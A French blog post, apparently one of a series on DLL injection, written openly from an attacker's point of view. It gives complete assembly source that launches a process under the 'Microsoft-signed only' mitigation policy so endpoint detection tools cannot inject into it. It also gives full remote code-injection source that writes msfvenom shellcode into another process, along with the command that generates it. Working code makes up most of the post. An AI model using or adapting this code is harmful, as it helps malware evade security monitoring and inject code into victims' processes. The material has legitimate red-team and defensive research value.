
Je présente ici une méthode de blocage de l'injection de DLL d'un point de vue de l'attaquant. En effet, il peut arriver qu'un poste victime ait installé sur son système un __EDR__ (Endpoint Detection and Response) qui effectue de l'injection de DLL sur chaque nouveau processus afin de hooker certaines fonctions dites "suspectes" (**CreateRemoteThread()**, **VirtualProtect()**, ...). En tant qu'attaquant, on ne veut pas que notre processus malveillant subisse de l'injection de DLL.

Les méthodes d'injection de DLL que j'ai présenté précédement sont: 

* https://dokyx.fr/blog/oirtslkdf_injectdll_createremotethread/

* https://dokyx.fr/blog/uyniouliu_injectdll_ntcreatethreadex/

* https://dokyx.fr/blog/lsdjqfqf_injectdll_rtlcreateuserthread/

* https://dokyx.fr/blog/sdkjsd_injectdll_setwindowshookex/

Il me reste encore quelques méthodes d'injection de DLL à présenter, mais j'avoue que je commence à me lasser un peu. C'est pourquoi, je vous présente cette technique qui permet de bloquer l'injection de DLL avant la fin de la série sur l'injection de DLL. Même si ça reste dans le thème ^^

Il est possible de spécifier une liste d'attributs lors de la création d'un thread/processus. Ces attributs permettent notamment de spécifier les politiques d'atténuation (**mitigation policies**), comme l'__ASLR__, le __DEP__, etc. On peut voir cette politique d'atténuation sur un processus quelconque sur la capture ci-dessous en guise d'exemple:

![image alt text](/images/dll-injection/block_mitigation_std.png)

On y voit bien que l'__ASLR__ (Address Space Layout Randomization) et le __DEP__ (Data Execution Prevention) sont mises en place. Il existe de multiples autres politique d'atténuation, dont une qui s'appelle:

* <span style="color:red">Signatures restricted (Microsoft only)</span>

C'est celle-là qui va nous intéresser car elle spécifie que seules les binaires DLLs signées par Microsoft ont la possibilité d'être injectées dans le processus/thread ciblé.

C'est une aubaine, car l'__EDR__ présent sur la machine victime qui fera de l'injection de DLL, ne poussera certainement pas une DLL signée par Microsoft, ce qui bloquera donc son mécanisme d'injection.

Curieusement ce procédé de manipulation des attributs est présenté dans la msdn: https://docs.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

Il suffit alors de reprendre le code présenté par Microsoft :). __xpn__ reprend d'ailleurs cette méthode et l'adapte à du code VBA: https://blog.xpnsec.com/protecting-your-malware/

Pour modifier la politique d'atténuation d'un processus, il faut d'abord initialiser la liste d'attributs, puis la mettre à jour. Pour cela, je vais utiliser les fonctions __InitializeProcThreadAttributeList()__ (kernel32.dll), et __UpdateProcThreadAttribute()__ (kernel32.dll). L'exemple fourni par la msdn utilise également __HeapAlloc()__ (kernel32.dll), pour contenir la liste d'attributs. Pour ma part, je vais utiliser __VirtualAlloc()__ (kernel32.dll); c'est juste une question de préférences.

Ceux qui ont regardé la msdn de la fonction __UpdateProcThreadAttribute()__ (https://docs.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute) ont vu qu'il y avait de très nombreux attributs disponibles. Celui qui permet d'avoir la politique __Signature restricted (Microsoft only)__ est:

* <span style="color:red"> PROCESS\_CREATION\_MITIGATION\_POLICY\_BLOCK\_NON\_MICROSOFT\_BINARIES\_ALWAYS\_ON</span>

Afin de pouvoir modifier la polique d'atténuation, il faut pouvoir modifier la structure __STARTUPINFOEXA__ (https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa) dont la structure est présentée ci-dessous:

```
STARTUPINFOEXA struct
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
STARTUPINFOEXA ends
```

On voit que la liste d'attributs sera spécifée dans l'élément __lpAttributeList__.

Le bout de code qui permet de d'initialiser une politique d'atténuation différente de celle qui est classiquement utilisée lors de la création d'un processus est alors:


```
InitializeProcThreadAttributeList PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD
VirtualAlloc PROTO :DWORD,:DWORD,:DWORD,:DWORD

; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
STARTUPINFOA    struct 
	cb    			DWORD    ?
	lpReserved    	DWORD    ?
	lpDesktop    	DWORD    ?
	lpTitle    		DWORD    ?
	dwX    			DWORD    ?
	dwY    			DWORD    ?
	dwXSize    		DWORD    ?
	dwYSize    		DWORD    ?
	dwXCountChars   DWORD    ?
	dwYCountChars   DWORD    ?
	dwFillAttribute DWORD    ?
	dwFlags    		DWORD    ?
	wShowWindow    	WORD    ?
	cbReserved2    	WORD    ?
	lpReserved2    	DWORD    ?
	hStdInput    	DWORD    ?
	hStdOutput    	DWORD    ?
	hStdError    	DWORD    ?
STARTUPINFOA    ends

; https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
STARTUPINFOEXA struct
	StartupInfo   	STARTUPINFOA <>
	lpAttributeList DWORD ?
STARTUPINFOEXA ends

.data?
	startinfo       STARTUPINFOA <>
    	startinfoex     STARTUPINFOEXA <>

.code
	push 	offset lpSize
	push 	0
	push 	1
	push 	0
	call 	InitializeProcThreadAttributeList

	push 	4 ; PAGE_READWRITE
	push 	1000h ; MEM_COMMIT
	push 	[lpSize]
	push 	0
	call 	VirtualAlloc
	mov 	startinfoex.lpAttributeList, eax

	push 	offset lpSize
	push 	0
	push 	1
	push 	startinfoex.lpAttributeList
	call 	InitializeProcThreadAttributeList
```

Et le bout de code qui permet de mettre à jour cette politique d'atténuation (__Signature restricted (Microsoft only)__) est:

```
UpdateProcThreadAttribute PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

policy struct
	part1 DWORD ?
	part2 DWORD ?
policy ends

.data?
	pol	policy <>

.code
	; PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
	mov 	pol.part1, 0
	mov 	pol.part2, 1000h

	; https://docs.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
	push 	0
	push 	0
	push 	sizeof pol
	push 	offset pol
	push 	20007h; PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
	push 	0
	push 	startinfoex.lpAttributeList
	call 	UpdateProcThreadAttribute
```

Il s'agit à présent de définir le processus qui aura cette nouvelle politique d'atténuation. Je choisi pour l'exemple de lancer une invite de commande (__cmd.exe__), mais cela aurait pû être n'importe quel autre code malveillant ^^ J'utilise pour ça la fonction __CreateProcess()__ (kernel32.dll) comme suit:

```
.data
	pName 	db "C:\Windows\System32\cmd.exe", 0

.data?
	procinfo        PROCESS_INFORMATION <>
.code
	push 	offset procinfo
	push 	offset startinfoex
	push 	0
	push 	0
	push 	80000h ;EXTENDED_STARTUPINFO_PRESENT
	push 	1
	push 	0
	push 	0
	push 	offset pName
	push 	0
	call 	CreateProcessA
```

Une fois compilé et exécuté, notre code malveillant va donc lancer __cmd.exe__ avec une politique d'atténuation qui empêche toute injection de DLL possible excepté pour une DLL signé par Microsoft. Notre EDR n'a qu'à bien se tenir, nondidiou ! On peut voir ci-dessous la capture présentant ce résultat:

![image alt text](/images/dll-injection/block_mitigation.png)

<details><summary><font color="red">Ici se trouve le code permettant de bloquer l'injection de DLL</font></summary>
<p>
```
.586
.model flat, stdcall

; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL dwExitCode:DWORD
CreateProcessA PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
InitializeProcThreadAttributeList PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD
UpdateProcThreadAttribute PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
VirtualAlloc PROTO :DWORD,:DWORD,:DWORD,:DWORD

; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
PROCESS_INFORMATION    struct 
	hProcess    	DWORD    ?
	hThread    	DWORD    ?
	dwProcessId    	DWORD    ?
	dwThreadId    	DWORD    ?
PROCESS_INFORMATION    ends

; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
STARTUPINFOA    struct 
	cb    		DWORD    ?
	lpReserved    	DWORD    ?
	lpDesktop    	DWORD    ?
	lpTitle    	DWORD    ?
	dwX    		DWORD    ?
	dwY    		DWORD    ?
	dwXSize    	DWORD    ?
	dwYSize    	DWORD    ?
	dwXCountChars   DWORD    ?
	dwYCountChars   DWORD    ?
	dwFillAttribute DWORD    ?
	dwFlags    	DWORD    ?
	wShowWindow    	WORD    ?
	cbReserved2    	WORD    ?
	lpReserved2    	DWORD    ?
	hStdInput    	DWORD    ?
	hStdOutput    	DWORD    ?
	hStdError    	DWORD    ?
STARTUPINFOA    ends

; https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
STARTUPINFOEXA struct
	StartupInfo   	STARTUPINFOA <>
	lpAttributeList DWORD ?
STARTUPINFOEXA ends

policy struct
	part1 DWORD ?
	part2 DWORD ?
policy ends

.data
	pName 		db "C:\Windows\System32\cmd.exe", 0

.data?
    	startinfo       STARTUPINFOA  <>
    	startinfoex     STARTUPINFOEXA  <>
    	procinfo        PROCESS_INFORMATION <>
    	lpSize 	    	dd ?
    	pol 	    	policy <>

.code
Start PROC

	push 	offset lpSize
	push 	0
	push 	1
	push 	0
	call 	InitializeProcThreadAttributeList

	push 	4 ; PAGE_READWRITE
	push 	1000h ; MEM_COMMIT
	push 	[lpSize]
	push 	0
	call 	VirtualAlloc
	mov 	startinfoex.lpAttributeList, eax

	push 	offset lpSize
	push 	0
	push 	1
	push 	startinfoex.lpAttributeList
	call 	InitializeProcThreadAttributeList

	; PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
	mov 	pol.part1, 0
	mov 	pol.part2, 1000h

	; https://docs.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
	push 	0
	push 	0
	push 	sizeof pol
	push 	offset pol
	push 	20007h; PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
	push 	0
	push 	startinfoex.lpAttributeList
	call 	UpdateProcThreadAttribute

	push 	offset procinfo
	push 	offset startinfoex
	push 	0
	push 	0
	push 	80000h ;EXTENDED_STARTUPINFO_PRESENT
	push 	1
	push 	0
	push 	0
	push 	offset pName
	push 	0
	call 	CreateProcessA

_exit:
	xor eax, eax
	push eax
	call ExitProcess
	

Start ENDP
END

```
</p>
</details>

Il est intéressant d'utiliser les programmes que l'on a confectionné dans les articles précédents afin d'effectuer de l'injection de DLL et de constater qu'ils ne fonctionnent plus \\\\(^.^)//

![image alt text](/images/dll-injection/block_error.png)

En revanche, on a quand même envie de pouvoir bypasser cette mesure de protection si jamais on a envie de s'injecter dans un processus qui a ce genre de politique d'atténuation. J'ai pu constaté qu'une injection de code (pas de DLL, hein) fonctionne tout à fait. Ainsi le code suivant qui effectue de l'injection de code dans un processus qui a la politique d'atténuation __Signature restricted (Microsoft only)__ fonctionne tout à fait.

<details><summary><font color="red">Ici se trouve le code permettant de faire de l'injection de code dans un processus ayant la politique d'atténuation __Signature restricted (Microsoft only)__</font></summary>
<p>
```
.586
.model flat, stdcall

; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
OpenProcess PROTO STDCALL :DWORD,:DWORD,:DWORD
VirtualAllocEx PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
WriteProcessMemory PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
CreateRemoteThread PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD

.data
	PID 		dd 2412

	; msfvenom -p windows/exec cmd=calc.exe -f hex
        shellcode  db 90h
       		db 0fch,0e8h,082h,000h,000h,000h,060h,089h,0e5h,031h,0c0h,064h,08bh,050h
                db 030h,08bh,052h,00ch,08bh,052h,014h,08bh,072h,028h,00fh,0b7h,04ah,026h
                db 031h,0ffh,0ach,03ch,061h,07ch,002h,02ch,020h,0c1h,0cfh,00dh,001h,0c7h
                db 0e2h,0f2h,052h,057h,08bh,052h,010h,08bh,04ah,03ch,08bh,04ch,011h,078h
                db 0e3h,048h,001h,0d1h,051h,08bh,059h,020h,001h,0d3h,08bh,049h,018h,0e3h
                db 03ah,049h,08bh,034h,08bh,001h,0d6h,031h,0ffh,0ach,0c1h,0cfh,00dh,001h
                db 0c7h,038h,0e0h,075h,0f6h,003h,07dh,0f8h,03bh,07dh,024h,075h,0e4h,058h
                db 08bh,058h,024h,001h,0d3h,066h,08bh,00ch,04bh,08bh,058h,01ch,001h,0d3h
                db 08bh,004h,08bh,001h,0d0h,089h,044h,024h,024h,05bh,05bh,061h,059h,05ah
                db 051h,0ffh,0e0h,05fh,05fh,05ah,08bh,012h,0ebh,08dh,05dh,06ah,001h,08dh
                db 085h,0b2h,000h,000h,000h,050h,068h,031h,08bh,06fh,087h,0ffh,0d5h,0bbh
                db 0f0h,0b5h,0a2h,056h,068h,0a6h,095h,0bdh,09dh,0ffh,0d5h,03ch,006h,07ch
                db 00ah,080h,0fbh,0e0h,075h,005h,0bbh,047h,013h,072h,06fh,06ah,000h,053h
                db 0ffh,0d5h,063h,061h,06ch,063h,02eh,065h,078h,065h,000h
        endShellcode db 0

.data?
    	hProcess 	dd ?
 	baseAddr	dd ?
 	hKrnl32Addr 	dd ?
 	hLoadLibAddr 	dd ?

.code

Start PROC
; calculate the lenght of the shellcode
        mov     	eax, offset shellcode
        mov     	esi, offset endShellcode
        sub     	esi, eax

_openProcess:
	mov 		eax, PID
	push 		eax
	push 		0
	push 		1F0FFFh ; PROCESS_ALL_ACCESS
	call 		OpenProcess
	cmp 		eax, 0
	jz 		_exit
	mov 		[hProcess], eax
	
_virtualAllocEx:
	push 		40h ; PAGE_EXECUTE_READWRITE
	push 		3000h ; MEM_RESERVE or MEM_COMMIT
	push 		esi
	push  		0
	push 		hProcess
	call 		VirtualAllocEx
	cmp 		eax, 0
	jz 		_exit
	mov 		[baseAddr], eax

_writeProcessMemory:
	push 		0
	push  		esi
	push 		offset shellcode
	push 		baseAddr
	push 		hProcess
	call 		WriteProcessMemory
	cmp 		eax, 0
	jz 		_exit

_createRemoteThread:
	push 		0
	push 		0
	push  		baseAddr
	push 		baseAddr
	push 		0
	push 		0
	push 		hProcess
	call 		CreateRemoteThread
	cmp 		eax, 0
	jz 		_exit

_exit:
	xor eax, eax
	push eax
	call ExitProcess

Start ENDP
```
</p>
</details>

Je vous laisse décortiquer ce code tout seul, il n'est pas très différent de celui utilisé pour effectuer de l'injection de DLL via __CreateRemoteThread()__. Le code malveillant utilisé ici est une payload issue de metasploit (__WinExec()__ de __calc.exe__) crée comme suit:

```
msfvenom -p windows/exec cmd=calc.exe -f hex
```

On a pu voir dans cet article comment modifier la politique d'atténuation de nos codes malveillants afin d'empêcher un EDR d'y effectuer de l'injection de DLL. 

De plus, j'ai présenté une manière de contourner cette politique d'atténuation (Signature restricted (Microsoft only)) si l'on souhaite s'injecter dans un processus qui a la-dite politique d'atténuation, en effectuant de l'injection de code.

C'est donc une méthode très puissante et qui est malheureusement/heureusement très bien documentée dans la msdn.



